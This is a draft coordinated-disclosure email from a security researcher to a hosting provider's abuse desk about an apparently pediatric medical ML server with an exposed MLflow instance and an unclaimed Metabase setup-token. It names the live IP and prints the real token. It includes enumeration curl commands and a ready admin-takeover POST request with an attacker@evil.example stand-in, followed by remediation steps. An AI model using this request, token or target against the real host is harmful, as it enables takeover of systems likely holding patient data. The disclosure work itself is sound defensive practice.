---
to: abuse@hetzner.com
cc: abuse@nuclide-research.com
severity: CRITICAL
ip: 65.109.36.121
institution: Hetzner DE — pediatric medical ML operator with 224 unauth MLflow experiments + Metabase setup-token unclaimed (pre-auth admin takeover)
status: DRAFT
date: 2026-05-06
---

**To:** abuse@hetzner.com
**Cc:** abuse@nuclide-research.com
**Subject:** Pediatric medical ML operator — 224 unauthenticated MLflow experiments + Metabase pre-auth admin-takeover via unclaimed setup-token (65.109.36.121)

---

Nicholas Michael Kloster / NuClide Research
nicholas@nuclide-research.com

2026-05-06

**Re:** HIPAA-relevant pediatric medical ML operator with stacked MLflow + Metabase exposure
**IP:** 65.109.36.121 (Hetzner Helsinki)
**Severity:** CRITICAL

---

I'm an independent security researcher conducting good-faith AI infrastructure research under the NuClide Research umbrella (CISA disclosures CVE-2025-4364, ICSA-25-140-11). This is an unsolicited coordinated-disclosure notification.

---

## Summary

Hetzner customer host `65.109.36.121` runs a **pediatric medical ML operation** with two publicly-reachable services in misconfigured states:

1. **MLflow 2.22.1** on port 5000 — fully unauthenticated; 224 experiments visible with naming patterns indicating sick-vs-healthy XGBoost classifiers operating on behavioral-pediatric data
2. **Metabase v0.55.12** on port 3000 — `setup-token` is publicly disclosed via `/api/session/properties`, meaning **any internet visitor can claim the Metabase admin account** without prior credentials

Combined, the exposure is a HIPAA-class operator catastrophe. The MLflow alone leaks 4+ years of clinical-decision-support model development; the Metabase setup-takeover converts that into write access to whichever databases the operator has connected (17 drivers configured server-side).

This is documented in NuClide's ledger as event id 339 (MLflow component) since the original cloud survey on 2026-05-04. The Metabase finding was added today (2026-05-06) via the BI Dashboard cross-survey-correlation probe, escalating the combined severity to CRITICAL.

## Reproduction (non-destructive)

### Metabase setup-token disclosure

```bash
$ curl -s 'http://65.109.36.121:3000/api/session/properties' \
    -H 'Accept: application/json' | jq '.["setup-token"], .version'
"8f504ffb-d62d-4fa3-a03f-053cf7740a32"
{"tag": "v0.55.12"}
```

The token in the response is the **un-claimed Metabase admin slot**. By design, Metabase exposes the setup-token publicly until the first admin user is created via `POST /api/setup` with that token. Once an admin claims the token, this endpoint returns `null`. The fact that it returns a non-null UUID **after the host has been operational for 6+ months** indicates either:

- The setup flow was never completed (admin login is via a different mechanism, e.g. SSO, but the token wasn't invalidated), OR
- The Metabase deployment has a state bug where the token persists incorrectly

Either way, an attacker can call:

```bash
POST http://65.109.36.121:3000/api/setup
Content-Type: application/json
{
  "token": "8f504ffb-d62d-4fa3-a03f-053cf7740a32",
  "user": {"first_name":"...", "email":"attacker@evil.example", "password":"..."},
  "prefs": {"site_name":"..."}
}
```

…and become the operator's Metabase administrator. NuClide DID NOT call this endpoint with the real token. Only `GET /api/session/properties` (a public Metabase endpoint by design) was called.

### MLflow 224-experiment disclosure

```bash
$ curl -s 'http://65.109.36.121:5000/version'
2.22.1

$ curl -s -X POST -H 'Content-Type: application/json' \
    -d '{"max_results":1000}' \
    'http://65.109.36.121:5000/api/2.0/mlflow/experiments/search' \
    | jq '.experiments[].name' | head -10
"beh_ped_lyi_sta_ml_etgn_cal_cri_100_min_v4_check_final2"
"fts_large_v1_cal_all_cri_100_day_sic_vs_hlt_f1_xgboost_updated1"
"beh_ped_lyi_sta_ml_etgn_cal_cri_100_min_v4_check_final1"
"beh_ped_lyi_sta_ml_etgn_cal_cri_100_min_v4_check_final"
[+ 220 more]
```

The naming pattern decodes to: behavioral-pediatric (`beh_ped`) etiologic-ML (`ml_etgn`) sick-vs-healthy XGBoost classifiers (`sic_vs_hlt_xgboost`) with calibration windows (`cal_cri_100_min` / `cal_cri_100_day`) — a clinical-decision-support pipeline for pediatric critical-care prediction.

The MLflow version (2.22.1) is post-patch for CVE-2023-1177, so the actively-exploited path-traversal class affecting earlier hosts is NOT relevant here. The exposure is the metadata + experiment-progression leak alone.

## Why this matters

For the operator (Hetzner customer):

- **Pre-auth admin takeover** of Metabase converts a "data viewer" exposure into a "data writer" exposure. The attacker who claims the setup-token has full SQL access against any database the operator has connected — typically the operator's primary application database. For a pediatric medical operation, that database almost certainly contains PHI.
- **224 ML experiments** with full hyperparameter sweeps, calibration tables, and prediction-window settings represent 4+ years of clinical research IP. A competitor reading these has the operator's complete model strategy.
- **HIPAA Article 33 / OCR notification** considerations apply if patient-identifiable content is upstream of the ML pipeline (which is necessarily true for sick-vs-healthy classifiers trained on real patient cohorts).

For Hetzner abuse:

- The customer needs immediate notification. Both fixes are operator-side and one-line:
  - MLflow: bind to localhost or restrict via firewall (`ufw deny 5000/tcp`)
  - Metabase: complete the setup flow (claim the admin), or rotate the token via the database

## Remediation (for the customer)

```bash
# 1. CLAIM THE METABASE SETUP-TOKEN IMMEDIATELY.
#    The attacker race window opens with each /api/session/properties call.
#    Either complete the setup wizard at http://65.109.36.121:3000/setup
#    OR rotate the token in the application_db's setting table:
#       UPDATE setting SET value = NULL WHERE key = 'setup-token';

# 2. Restrict Metabase to admin-only network access:
ufw deny 3000/tcp
ufw allow from <admin-IP> to any port 3000

# 3. Restrict MLflow to admin-only network access:
ufw deny 5000/tcp
ufw allow from <admin-IP> to any port 5000

# 4. Front both with a reverse proxy + auth (nginx + auth_basic + TLS, or
#    Cloudflare Access, etc.) for any external collaborator workflow.

# 5. Audit Metabase's database connection list. Each connected datasource
#    should have a service account scoped to read-only with no write
#    permissions to PHI-containing tables. The Native Query interface
#    inherits whatever permissions the connection has.
```

Setup-token rotation reference: https://www.metabase.com/docs/latest/installation-and-operation/configuring-metabase#environment-variables

MLflow security baseline: https://mlflow.org/docs/latest/auth/index.html

## Reference

Full case study (with operator timeline, ML naming-pattern decode, methodology insights):
https://github.com/Nicholas-Kloster/AI-LLM-Infrastructure-OSINT/blob/main/case-studies/commercial/multi-pediatric-mlflow-metabase-setup-2026-05-06.md

Original MLflow cloud survey context:
https://github.com/Nicholas-Kloster/AI-LLM-Infrastructure-OSINT/blob/main/case-studies/commercial/mlflow-cloud-survey-2026-05.md

Happy to coordinate verification, or to provide additional traffic-pattern detail if Hetzner abuse needs it for the customer notification. Given the HIPAA-relevance and the pre-auth admin-takeover path, expedited remediation is requested.

Regards,
Nicholas Michael Kloster / NuClide Research
nicholas@nuclide-research.com
https://github.com/Nicholas-Kloster/AI-LLM-Infrastructure-OSINT
